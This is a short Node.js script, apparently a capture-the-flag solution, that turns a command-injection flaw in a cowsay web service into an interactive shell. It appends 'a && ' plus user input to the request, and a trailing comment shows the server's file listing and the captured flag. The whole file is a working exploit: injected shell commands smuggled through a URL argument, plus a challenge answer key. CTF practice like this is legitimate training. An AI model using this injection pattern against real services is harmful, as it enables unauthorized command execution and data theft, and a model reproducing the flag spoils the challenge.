const axios = require('axios');
const readline = require('readline');


async function main() {
  const base_url = 'https://caas.mars.picoctf.net/cowsay/';
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    terminal: false,
  });
  while (true) {
    await new Promise((resolve, reject) => {
      rl.question('$ ', (answer) => {
        resolve(answer);
      });
    })
      .then((cmd) => {
        const url = base_url + encodeURIComponent('a && ' + cmd);
        return axios.get(url);
      })
      .then((res) => {
        console.log(res.data);
      });
  }
}

main()


/*
$ ls
 ___
< a >
 ---
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock

$ cat falg.txt
 ___
< a >
 ---
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}

$
*/
